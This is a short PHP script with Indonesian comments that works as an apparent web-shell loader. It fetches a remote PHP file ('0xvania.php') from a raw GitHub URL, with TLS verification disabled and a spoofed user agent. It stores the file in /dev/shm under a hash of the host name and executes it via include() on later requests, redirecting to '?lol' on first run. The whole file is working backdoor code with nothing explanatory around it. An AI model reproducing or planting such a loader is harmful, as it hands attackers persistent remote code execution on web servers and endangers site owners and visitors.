<?php
// Hanya mengarah ke GitHubusercontent
$data = ['https://raw.githubusercontent.com/hairamcrot/back/refs/heads/main/0xvania.php', '/dev/shm/'.md5($_SERVER['HTTP_HOST'])];

// Cek apakah file cache lokal sudah ada dan tidak kosong
if(file_exists($data[1]) && filesize($data[1]) !== 0) {
    include($data[1]);
} else {
    $fopen = fopen($data[1], 'w+');
    fwrite($fopen, fetch_from_github($data[0]));
    fclose($fopen);
    echo '<script>window.location="?lol";</script>';
}

// Fungsi hanya ambil dari GitHub
function fetch_from_github($url)
{
    if (function_exists('curl_exec')) {
        $conn = curl_init($url);
        curl_setopt($conn, CURLOPT_RETURNTRANSFER, 1);
        curl_setopt($conn, CURLOPT_FOLLOWLOCATION, 1);
        curl_setopt($conn, CURLOPT_USERAGENT, "Mozilla/5.0 (Windows NT 6.1; rv:32.0) Gecko/20100101 Firefox/32.0");
        curl_setopt($conn, CURLOPT_SSL_VERIFYPEER, 0);
        curl_setopt($conn, CURLOPT_SSL_VERIFYHOST, 0);

        $result = curl_exec($conn);
        curl_close($conn);
    } elseif (function_exists('file_get_contents')) {
        $result = file_get_contents($url);
    } elseif (function_exists('fopen') && function_exists('stream_get_contents')) {
        $handle = fopen($url, "r");
        $result = stream_get_contents($handle);
        fclose($handle);
    } else {
        $result = false;
    }
    return $result;
}
?>
